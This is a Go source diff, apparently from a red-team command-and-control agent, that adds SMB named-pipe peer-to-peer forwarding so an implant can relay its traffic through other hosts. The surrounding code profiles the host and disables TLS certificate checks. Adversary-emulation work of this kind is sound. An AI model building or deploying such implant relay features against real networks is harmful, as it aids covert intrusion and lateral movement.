@@ -43,7 +43,7 @@ func runAgent(coms contact.Contact, profile map[string]interface{}) {
 	}
 }
 
-func buildProfile(server string, group string, sleep int, executors []string, privilege string, c2 string) map[string]interface{} {
+func buildProfile(server string, group string, sleep int, executors []string, privilege string, c2 string, upstreamPipePath string, localPipeName string) map[string]interface{} {
 	host, _ := os.Hostname()
 	user, _ := user.Current()
 	rand.Seed(time.Now().UnixNano())
@@ -66,6 +66,18 @@ func buildProfile(server string, group string, sleep int, executors []string, pr
 	profile["exe_name"] = filepath.Base(os.Args[0])
 	profile["c2"] = strings.ToUpper(c2)
 
+	if len(upstreamPipePath) > 0 {
+	    profile["upstreamPipePath"] = upstreamPipePath
+	} else {
+	    profile["upstreamPipePath"] = ""
+	}
+
+	if len(localPipeName) > 0 {
+	    profile["localPipePath"] = fmt.Sprintf("\\\\.\\pipe\\%s", localPipeName)
+	} else {
+	    profile["localPipePath"] = ""
+	}
+
 	return profile
 }
 
@@ -79,6 +91,19 @@ func chooseCommunicationChannel(profile map[string]interface{}, c2Config map[str
 
 	if coms.Ping(profile["server"].(string)) {
 		//go util.StartProxy(profile["server"].(string))
+		//go util.TestLocalListenDialReadWrite("\\\\.\\pipe\\mytestpipe")
+		//go util.TestListenDialReadWrite("\\\\.\\pipe\\mytestpipe")
+
+        if len(profile["localPipePath"].(string)) > 0 {
+            output.VerbosePrint("[*] GOING TO TEST RECEIVING DATA FROM SMB PIPE")
+		    go util.StartNamedPipeForwarder(profile["localPipePath"].(string), profile["server"].(string), "http")
+        }
+
+        if len(profile["upstreamPipePath"].(string)) > 0 {
+            output.VerbosePrint("[*] GOING TO TEST SENDING DATA TO SMB PIPE")
+            util.SendDataToPipe(profile["upstreamPipePath"].(string), []byte("Hello world"))
+		}
+
 		return coms
 	}
 	proxy := util.FindProxy()
@@ -98,7 +123,7 @@ func validC2Configuration(coms contact.Contact, c2Selection string, c2Config map
 	return false
 }
 
-func Core(server string, group string, sleep string, delay int, executors []string, c2 map[string]string, verbose bool) {
+func Core(server string, group string, sleep string, delay int, executors []string, c2 map[string]string, upstreamPipePath string, localPipeName string, verbose bool) {
 	http.DefaultTransport.(*http.Transport).TLSClientConfig = &tls.Config{InsecureSkipVerify: true}
 
 	sleepInt, _ := strconv.Atoi(sleep)
@@ -113,7 +138,19 @@ func Core(server string, group string, sleep string, delay int, executors []stri
 	output.VerbosePrint(fmt.Sprintf("initial delay=%d", delay))
 	output.VerbosePrint(fmt.Sprintf("c2 channel=%s", c2["c2Name"]))
 
-	profile := buildProfile(server, group, sleepInt, executors, privilege, c2["c2Name"])
+	if len(upstreamPipePath) > 0 {
+	    output.VerbosePrint(fmt.Sprintf("Using named pipe %s for upstream communications.", upstreamPipePath))
+	} else {
+	    output.VerbosePrint("No named pipe specified for upstream communications.")
+	}
+
+	if len(localPipeName) > 0 {
+	    output.VerbosePrint(fmt.Sprintf("Listening on named pipe %s for p2p forwarding.", localPipeName))
+	} else {
+	    output.VerbosePrint("No named pipe specified to listen on.")
+	}
+
+	profile := buildProfile(server, group, sleepInt, executors, privilege, c2["c2Name"], upstreamPipePath, localPipeName)
 	util.Sleep(float64(delay))
 
 	for {
